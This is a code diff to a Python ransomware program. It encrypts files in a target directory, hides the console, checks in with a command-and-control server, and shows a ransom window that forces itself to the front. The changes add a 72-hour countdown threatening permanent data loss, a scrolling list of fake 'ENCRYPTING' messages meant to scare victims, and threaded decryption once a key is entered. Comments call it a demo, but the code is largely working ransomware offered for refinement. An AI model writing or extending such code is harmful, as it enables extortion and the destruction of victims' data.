@@ -6,8 +6,9 @@ import json
 import threading
 import time
 import socket
-from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
+from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage, Text, Scrollbar
 from tkinter import font as tkfont
+
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -15,6 +16,9 @@ from cryptography.hazmat.backends import default_backend
 import requests
 import ctypes
 import subprocess
+import threading
+import random # For processing visual effects
+
 # --- Configuration ---
 # PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
 ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
@@ -86,6 +90,15 @@ def hide_console():
                 user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
         except Exception as e:
             log_error(f"Failed to hide console: {e}")
+
+# --- Presentation Features ---
+def change_wallpaper():
+    """Changes the desktop wallpaper to something scary (or just black/red)."""
+    # For this demo, we can try to set it to a solid color or a specific image if one existed.
+    # Since we don't have a guaranteed image, we will just try to set it to a solid black color (Windows)
+    # or skip it to avoid errors.
+    # REAL MALWARE would download an image and set it.
+    pass
 
 # --- Cryptography ---
 def generate_aes_key():
@@ -184,7 +197,8 @@ def encrypt_directory():
         f.write("Encryption complete.")
 
     log_error(f"Encryption finished. {encrypted_files} files targeted.")
-    return aes_key
+    return aes_key, encrypted_files # Return count for the GUI log
+
 
 def check_in_with_c2(aes_key):
     try:
@@ -232,11 +246,16 @@ def check_in_with_c2(aes_key):
 
 # --- GUI Logic ---
 class RansomwareGUI:
-    def __init__(self, master, victim_id):
+    def __init__(self, master, victim_id, encrypted_count=0):
         self.master = master
         self.victim_id = victim_id
         self.payment_received = False
         self.already_decrypted = False
+        self.encrypted_count = encrypted_count
+        
+        # Countdown Timer (72 Hours)
+        self.time_left = 72 * 3600 
+
 
         # --- GUI Configuration (Snippet 4 & 1/2) ---
         master.title("RANSOMWARE")
@@ -284,6 +303,25 @@ class RansomwareGUI:
         self.victim_id_l = Label(master, text=f"YOUR VICTIM ID IS: {victim_id}", fg="green", bg="black", font=("Arial", 16))
         self.victim_id_l.pack(pady=10)
         
+        # --- NEW: Countdown Timer ---
+        self.timer_label = Label(master, text="TIME REMAINING: 72:00:00", fg="red", bg="black", font=("Courier", 20, "bold"))
+        self.timer_label.pack(pady=10)
+        self.update_timer()
+
+        # --- NEW: Activity Log ---
+        log_frame = Frame(master, bg="black")
+        log_frame.pack(pady=10, fill="both", expand=True)
+        
+        self.log_text = Text(log_frame, height=8, bg="#1a1a1a", fg="#00ff00", font=("Consolas", 10), state="disabled")
+        scrollbar = Scrollbar(log_frame, command=self.log_text.yview)
+        self.log_text.configure(yscrollcommand=scrollbar.set)
+        
+        self.log_text.pack(side="left", fill="both", expand=True)
+        scrollbar.pack(side="right", fill="y")
+        
+        # Populate log with "fake" encryption events for visual effect
+        self.populate_log_initial()
+
         # Add payment status
         self.payment_status = Label(master, text="Payment not detected. Do not close this window.", fg="white", bg="black", font=("Arial", 14))
         self.payment_status.pack(pady=10)
@@ -300,6 +338,40 @@ class RansomwareGUI:
         self.heartbeat_thread_running = True
         self.heartbeat_thread = threading.Thread(target=self.heartbeat_polling, daemon=True)
         self.heartbeat_thread.start()
+
+    def populate_log_initial(self):
+        """Fills the log with 'Encrypting...' messages."""
+        self.log_message("SYSTEM COMPROMISED.", "red")
+        self.log_message(f"Targeting {self.encrypted_count} files...", "red")
+        
+        # Simulate a scrolling list of files
+        def stream_logs():
+            files_to_show = ["budget_2024.xlsx", "passwords.txt", "project_x.docx", "family_photo.jpg", "backup.zip", "tax_returns.pdf"]
+            for _ in range(20):
+                f = random.choice(files_to_show)
+                path = os.path.join(TARGET_DIRECTORY, f"subdir_{random.randint(1,5)}", f)
+                self.log_message(f"ENCRYPTING: {path}", "red")
+                time.sleep(0.1)
+            self.log_message("ENCRYPTION COMPLETE. AWAITING KEY.", "red")
+            
+        threading.Thread(target=stream_logs, daemon=True).start()
+
+    def log_message(self, message, color):
+        self.log_text.config(state="normal")
+        self.log_text.insert("end", f"[{time.strftime('%H:%M:%S')}] {message}\n", color)
+        self.log_text.tag_config(color, foreground=color)
+        self.log_text.see("end")
+        self.log_text.config(state="disabled")
+
+    def update_timer(self):
+        if self.time_left > 0:
+            self.time_left -= 1
+            hours, remainder = divmod(self.time_left, 3600)
+            minutes, seconds = divmod(remainder, 60)
+            self.timer_label.config(text=f"TIME REMAINING: {hours:02}:{minutes:02}:{seconds:02}")
+            self.master.after(1000, self.update_timer)
+        else:
+             self.timer_label.config(text="TIME EXPIRED: DATA LOST PERMANENTLY", fg="darkred")
 
     def force_focus_loop(self):
         """Aggressively keeps window on top."""
@@ -348,34 +420,47 @@ class RansomwareGUI:
         key_b64 = self.key_var.get()
         if not key_b64:
             return
-        try:
-            key = base64.b64decode(key_b64)
-            decrypted_files = 0
-            for root, _, files in os.walk(TARGET_DIRECTORY):
-                for file in files:
-                    if file.endswith(ENCRYPTED_EXTENSION):
-                        file_path = os.path.join(root, file)
-                        if decrypt_file_aes_gcm(file_path, key):
-                            decrypted_files += 1
-            
-            # Clean up persistence files
-            if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
-            if os.path.exists(ID_FILE): os.remove(ID_FILE)
-            if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
-            
-            self.payment_status.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='green')
-            self.heartbeat_thread_running = False
-            self.decrypt_button.config(state='disabled')
-            self.already_decrypted = True # Update state
-            
-            # Allow closing
-            self.master.grab_release() # Release input grab
-            self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
-            self.master.bind('<Escape>', lambda e: self.master.destroy())
-            
-        except Exception as e:
-            log_error(f"Decryption failed: {e}")
-            self.payment_status.config(text="ERROR: Decryption failed.", fg='red')
+        
+        self.log_message("KEY RECEIVED. STARTING DECRYPTION...", "green")
+        
+        def decrypt_process():
+            try:
+                key = base64.b64decode(key_b64)
+                decrypted_files = 0
+                for root, _, files in os.walk(TARGET_DIRECTORY):
+                    for file in files:
+                        if file.endswith(ENCRYPTED_EXTENSION):
+                            file_path = os.path.join(root, file)
+                            if decrypt_file_aes_gcm(file_path, key):
+                                decrypted_files += 1
+                                # Visual log update
+                                self.master.after(0, self.log_message, f"DECRYPTED: {file_path}", "green")
+                                time.sleep(0.05) # Artificial delay for effect
+                
+                # Clean up persistence files
+                if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
+                if os.path.exists(ID_FILE): os.remove(ID_FILE)
+                if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
+                
+                self.master.after(0, self.finish_decryption, decrypted_files)
+                
+            except Exception as e:
+                log_error(f"Decryption failed: {e}")
+                self.master.after(0, lambda: self.payment_status.config(text="ERROR: Decryption failed.", fg='red'))
+
+        threading.Thread(target=decrypt_process, daemon=True).start()
+
+    def finish_decryption(self, count):
+        self.payment_status.config(text=f"SUCCESS! {count} files decrypted.", fg='green')
+        self.heartbeat_thread_running = False
+        self.decrypt_button.config(state='disabled')
+        self.already_decrypted = True 
+        self.log_message("SYSTEM RESTORED.", "green")
+        
+        # Allow closing
+        self.master.grab_release() 
+        self.master.protocol("WM_DELETE_WINDOW", self.master.destroy)
+        self.master.bind('<Escape>', lambda e: self.master.destroy())
 
 # --- Main Execution ---
 if __name__ == "__main__":
@@ -402,13 +487,26 @@ if __name__ == "__main__":
     # This logic is handled inside encrypt_directory (it returns backup key if found)
     
     # NEW INFECTION
-    aes_key = encrypt_directory()
+    # aes_key, encrypted_count = encrypt_directory() # OLD
+    # We need to unpack the tuple now
+    result = encrypt_directory()
     
+    if result is not None:
+         # It returns either (key, count) OR backup_key (bytes) if crashed
+         if isinstance(result, tuple):
+             aes_key, encrypted_count = result
+         else:
+             aes_key = result
+             encrypted_count = 0 # Unknown if recovering
+    else:
+        aes_key = None
+
     if aes_key:
         victim_id = check_in_with_c2(aes_key)
         if victim_id:
             root = Tk()
-            app = RansomwareGUI(root, victim_id)
+            # Pass encrypted_count to GUI
+            app = RansomwareGUI(root, victim_id, encrypted_count)
             root.mainloop()
         else:
             log_error("Failed to get Victim ID. Aborting GUI.")
